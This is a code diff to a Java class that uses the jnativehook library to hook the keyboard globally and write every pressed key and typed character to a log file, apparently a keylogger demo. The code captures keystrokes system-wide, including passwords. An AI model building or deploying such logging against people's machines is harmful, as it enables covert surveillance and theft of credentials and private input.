@@ -8,14 +8,17 @@ import org.jnativehook.keyboard.NativeKeyListener;
 import java.io.IOException;
 
 public class GlobalKeyListener implements NativeKeyListener{
-    private ConfigLogger logger;
+    private final ConfigLogger loger;
     public GlobalKeyListener() throws IOException {
-        this.logger = new ConfigLogger("keyLog.txt");
+        this.loger = new ConfigLogger("demo-log.txt");
     }
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-        String txt = NativeKeyEvent.getKeyText(e.getKeyCode());
-        logger.writeFile(txt);
+        String speicalKeys = NativeKeyEvent.getKeyText(e.getKeyCode());
+
+        if (speicalKeys.length() > 1 ){
+            loger.writeFile(speicalKeys);
+        }
         // Exits the program
         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             try {
@@ -26,12 +29,14 @@ public class GlobalKeyListener implements NativeKeyListener{
         }
     }
     @Override
-    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
-
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        String letter = String.valueOf(e.getKeyChar());
+        if (letter.matches("^[a-zA-Z0-9!@#$&()\\-`.+,/\"]*$")){
+            loger.writeFile(letter);
+        }
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
-
     }
 }
